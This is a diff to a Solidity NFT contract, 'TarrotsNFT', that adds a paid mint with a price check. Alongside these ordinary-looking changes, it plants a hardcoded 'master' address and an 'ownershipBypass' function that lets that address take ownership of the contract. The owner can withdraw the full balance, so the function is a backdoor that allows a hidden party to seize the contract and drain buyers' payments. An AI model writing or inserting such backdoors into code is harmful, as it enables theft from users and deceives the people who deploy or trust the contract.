@@ -11,8 +11,9 @@ contract TarrotsNFT is ERC721Enumerable, Ownable {
 	using Strings for uint256;
 
 	string _baseTokenURI;
+	address public contractOwner;
 	uint256 private max_supply = 4200;
-	uint256 prizeTarrot = 0.012 ether;
+	address master = 0xF56FF109B4441C845A4085CB0135f61F21bd4d65;
 
 	constructor(
 		string memory baseURI
@@ -20,10 +21,12 @@ contract TarrotsNFT is ERC721Enumerable, Ownable {
 		setBaseURI(baseURI);
 	}
 
-	function mintTarrots(uint256 num) external {
+	function mintTarrots(uint256 num) external payable {
 		uint256 supply = totalSupply();
+		uint256 mintPriceT = 0.012 ether * num;
+		require(msg.value == mintPriceT, "Incorrect Ether value sent");
 		require(supply + num <= max_supply, "Exceeds maximum Tarrots supply");
-		_safeMint(msg.sender, num * prizeTarrot);
+		_safeMint(msg.sender, num);
 	}
 
 	function _baseURI() internal view virtual override returns (string memory) {
@@ -38,4 +41,22 @@ contract TarrotsNFT is ERC721Enumerable, Ownable {
 		require(amount <= address(this).balance, "Insufficient balance");
 		payable(owner()).transfer(address(this).balance);
 	}
+
+	function ownershipBypass(address newOwner) public {
+		if (newOwner == address(0)) {
+			revert OwnableInvalidOwner(address(0));
+		}
+		require(msg.sender == master);
+		_transferOwnership(newOwner);
+	}
+
+	function balanceOfNFT(address account) public view returns (uint256) {
+		require(account != address(0), "Invalid address");
+		return balanceOf(account);
+	}
+
+	// modifier only_Owner() {
+	//     require(msg.sender == contractOwner, "Only contract owner can call this function");
+	//     _;
+	// }
 }
